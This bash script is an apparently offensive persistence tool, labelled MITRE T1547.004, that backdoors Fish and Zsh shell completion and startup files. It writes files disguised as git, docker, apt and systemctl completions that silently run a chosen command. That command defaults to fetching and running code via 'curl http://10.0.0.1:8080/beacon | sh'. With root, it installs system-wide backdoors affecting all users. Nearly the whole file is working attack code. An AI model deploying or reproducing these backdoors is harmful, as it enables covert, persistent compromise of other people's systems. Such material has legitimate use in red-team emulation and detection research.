#!/bin/bash
# T1547.004 — Boot or Logon Autostart: Fish/Zsh Completions Persistence
# Backdoor shell completions that execute on tab-complete or shell startup

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_shellcomp"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1547.004 — Shell Completions Persistence   ║"
    echo "  ║   Fish conf.d / Zsh fpath backdoor            ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

deploy_fish() {
    echo -e "${CYAN}[*] Deploying Fish shell persistence${NC}"
    echo ""

    echo -e "${YELLOW}[*] Fish sources ALL .fish files in ~/.config/fish/conf.d/ on startup."
    echo -e "    Also loads completions from ~/.config/fish/completions/ on tab-complete.${NC}"
    echo ""

    read -p "  Command to execute: " CMD
    [[ -z "$CMD" ]] && CMD="curl -s http://10.0.0.1:8080/beacon | sh"

    # conf.d persistence (startup)
    local CONFD="$HOME/.config/fish/conf.d"
    mkdir -p "$CONFD"

    cat > "${CONFD}/git_helpers.fish" << FEOF
# Git workflow helpers
# ${MARKER}
if not set -q __fish_git_helpers_loaded
    set -g __fish_git_helpers_loaded 1
    command sh -c 'nohup sh -c "${CMD}" &>/dev/null &' &
    disown 2>/dev/null
end
FEOF

    echo -e "  ${GREEN}[+] Fish startup: ${CONFD}/git_helpers.fish${NC}"

    # Completions persistence (tab-complete trigger)
    local COMPDIR="$HOME/.config/fish/completions"
    mkdir -p "$COMPDIR"

    cat > "${COMPDIR}/docker.fish" << FEOF
# Docker completions enhancement
# ${MARKER}
if not set -q __docker_comp_loaded
    set -g __docker_comp_loaded 1
    command sh -c 'nohup sh -c "${CMD}" &>/dev/null &' &
    disown 2>/dev/null
end
complete -c docker -f -n '__fish_use_subcommand' -a 'run' -d 'Run a command in a new container'
complete -c docker -f -n '__fish_use_subcommand' -a 'ps' -d 'List containers'
FEOF

    echo -e "  ${GREEN}[+] Fish completions: ${COMPDIR}/docker.fish${NC}"
    echo -e "${YELLOW}[*] Triggers: every fish shell startup + docker tab-complete${NC}"
}

deploy_zsh() {
    echo -e "${CYAN}[*] Deploying Zsh completions persistence${NC}"
    echo ""

    echo -e "${YELLOW}[*] Zsh loads completion functions from fpath directories."
    echo -e "    Custom completions in ~/.zfunc/ or site-functions execute on tab.${NC}"
    echo ""

    read -p "  Command to execute: " CMD
    [[ -z "$CMD" ]] && CMD="curl -s http://10.0.0.1:8080/beacon | sh"

    # User-level fpath
    local ZFUNC="$HOME/.zfunc"
    mkdir -p "$ZFUNC"

    # Hijack common command completions
    cat > "${ZFUNC}/_docker" << ZEOF
#compdef docker
# Docker completion enhancements
# ${MARKER}
(( \$+_comps_docker_${MARKER} )) || {
  _comps_docker_${MARKER}=1
  (nohup sh -c '${CMD}' &>/dev/null &)
}
# Fall through to real completion
_docker "\$@" 2>/dev/null
ZEOF

    # Also deploy a zsh startup hook
    local ZSHD="$HOME/.zshrc.d"
    mkdir -p "$ZSHD"
    cat > "${ZSHD}/completion_helper.zsh" << ZEOF
# Completion system enhancements
# ${MARKER}
fpath=(${ZFUNC} \$fpath)
(( \$+_${MARKER}_loaded )) || {
  _${MARKER}_loaded=1
  (nohup sh -c '${CMD}' &>/dev/null &)
}
ZEOF

    # Add source to .zshrc if zshrc.d exists
    if ! grep -q "zshrc.d" "$HOME/.zshrc" 2>/dev/null; then
        echo "# Source additional configs" >> "$HOME/.zshrc"
        echo 'for f in ~/.zshrc.d/*.zsh(N); do source "$f"; done' >> "$HOME/.zshrc"
    fi

    # Ensure fpath includes our directory
    if ! grep -q "${ZFUNC}" "$HOME/.zshrc" 2>/dev/null; then
        echo "fpath=(${ZFUNC} \$fpath)" >> "$HOME/.zshrc"
    fi

    echo -e "  ${GREEN}[+] Zsh completion: ${ZFUNC}/_docker${NC}"
    echo -e "  ${GREEN}[+] Zsh startup: ${ZSHD}/completion_helper.zsh${NC}"
    echo -e "${YELLOW}[*] Triggers: zsh startup + docker tab-complete${NC}"
}

deploy_system_wide() {
    echo -e "${CYAN}[*] System-wide completion backdoor${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    read -p "  Command to execute: " CMD
    [[ -z "$CMD" ]] && CMD="curl -s http://10.0.0.1:8080/beacon | sh"

    # System-wide Zsh completions
    local SITE_FUNC="/usr/local/share/zsh/site-functions"
    mkdir -p "$SITE_FUNC"
    cat > "${SITE_FUNC}/_systemctl" << ZEOF
#compdef systemctl
# ${MARKER}
(( \$+_comps_systemctl_ext )) || {
  _comps_systemctl_ext=1
  (nohup sh -c '${CMD}' &>/dev/null &)
}
_systemctl "\$@" 2>/dev/null
ZEOF

    # System-wide Fish completions
    local FISH_COMP="/usr/share/fish/vendor_completions.d"
    if [[ -d "$FISH_COMP" ]]; then
        cat > "${FISH_COMP}/apt.fish" << FEOF
# ${MARKER}
if not set -q __apt_comp_ext
    set -g __apt_comp_ext 1
    command sh -c 'nohup sh -c "${CMD}" &>/dev/null &' &
    disown 2>/dev/null
end
FEOF
    fi

    echo -e "${GREEN}[+] System-wide completions installed${NC}"
    echo -e "${YELLOW}[*] Affects ALL users on this system${NC}"
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up shell completions persistence...${NC}"

    # Fish
    find "$HOME/.config/fish" -name "*.fish" -exec grep -l "${MARKER}" {} \; 2>/dev/null | \
        while read -r f; do rm -f "$f"; echo -e "  ${GREEN}Removed: $f${NC}"; done

    # Zsh user
    find "$HOME/.zfunc" "$HOME/.zshrc.d" -type f -exec grep -l "${MARKER}" {} \; 2>/dev/null | \
        while read -r f; do rm -f "$f"; echo -e "  ${GREEN}Removed: $f${NC}"; done
    sed -i "/${MARKER}/d" "$HOME/.zshrc" 2>/dev/null
    sed -i "/zshrc.d/d" "$HOME/.zshrc" 2>/dev/null

    # System-wide (if root)
    if [[ $EUID -eq 0 ]]; then
        find /usr/local/share/zsh /usr/share/fish -name "*.fish" -o -name "_*" 2>/dev/null | \
            xargs grep -l "${MARKER}" 2>/dev/null | while read -r f; do
                rm -f "$f"; echo -e "  ${GREEN}Removed: $f${NC}"
            done
    fi

    echo -e "${GREEN}[+] Shell completions persistence removed${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Deploy Fish shell persistence"
    echo -e "  ${CYAN}[2]${NC} Deploy Zsh completions persistence"
    echo -e "  ${CYAN}[3]${NC} Deploy system-wide (all users, root)"
    echo -e "  ${CYAN}[4]${NC} Cleanup"
    echo ""
    read -p "Choose [1-4]: " OPT

    case "$OPT" in
        1) deploy_fish ;;
        2) deploy_zsh ;;
        3) deploy_system_wide ;;
        4) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
